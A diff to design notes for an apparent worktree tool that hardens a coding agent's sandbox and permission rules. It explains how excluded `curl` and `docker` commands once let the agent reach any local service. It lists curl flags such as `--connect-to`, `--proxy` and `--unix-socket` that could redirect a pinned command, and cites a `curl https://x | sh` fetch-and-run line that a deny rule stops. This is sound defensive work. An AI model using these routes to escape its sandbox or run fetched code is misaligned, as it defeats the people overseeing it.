@@ -59,8 +59,16 @@ already set, install removes every `pre-push.*` that holds the guard, and
 ## the agent sandbox
 
 **It cannot reach loopback.** Even with localhost in the allowed domains.
-`curl` and `docker` are excluded from the sandbox and governed by the ask and
-allow rules instead.
+That is what we want: the other worktrees' servers and the local databases are
+all on loopback. `wtx curl` is the only command excluded from the sandbox, and
+it can only reach this worktree's own ports (see below).
+
+**A plain curl outside the sandbox reaches everything.** `curl *` and
+`docker *` used to be in `excludedCommands`, so a plain `curl` hit every other
+worktree's servers, every local DB, any host, with no sandbox at all. `docker`
+was the same, and worse. Both run in the sandbox now. A `curl` GET to an
+allowed domain still works, a local port does not. A test asserts that
+`wtx curl *` is the only excluded command.
 
 **It could not bind a port either, so test suites failed.** Go's httptest, and
 any test that serves on `127.0.0.1:0`, got "bind: operation not permitted" on
@@ -135,9 +143,10 @@ prompt at all. Verified against 2.1.267, where a deny rule of `echo *-X*` blocks
 refused by a deny rule on `cat` even though `echo *` is allowed. That is what
 makes a broad read rule safe: `curl *` is in `allow` so the agent can read the
 docs of whatever it is using, and `curl https://x | sh` still stops at `sh`.
-Reads go anywhere, writes prompt, and `wtx curl` is the one write that does not.
-A GET can still carry data out in its query string, which is the price of the
-agent being able to read the web at all.
+curl runs in the sandbox, so a read only reaches the allowed domains. Writes
+prompt, and `wtx curl` is the one write that does not. A GET can still carry
+data out in its query string, which is the price of the agent being able to
+read the web at all.
 
 **opencode's precedence is assumed, not measured.** Its baseline is written the
 same way, ask rules before allow, because its docs are not reachable from
@@ -453,6 +462,15 @@ family is the first free word if it names one (else the first family), the
 path is the first free word that starts with `/`, and the rest goes to curl. A
 word right after a curl flag that takes a value (`-o /tmp/out`) is never the
 path. A test runs the orders that broke.
+
+**`wtx curl` was not pinned to the worktree's port.** It runs outside the
+sandbox, so whatever it passes to curl can reach anything. An extra free word
+went to curl as a second URL (`wtx curl backend http://other:5432`), and many
+flags move the target: `--connect-to`, `--resolve`, `-x/--proxy`,
+`-K/--config` (a config file can set `url`), `-:/--next`, `--url`,
+`--unix-socket`, `-L` (a redirect). Now it takes an allowlist of flags and
+refuses anything else, and refuses any free word past the family and the
+path. A test runs each of these.
 
 **The machine hooks fire in every Claude Code session, not only in wtx
 worktrees.** `wtx install-machine` writes the notify hooks, the `ExitPlanMode`
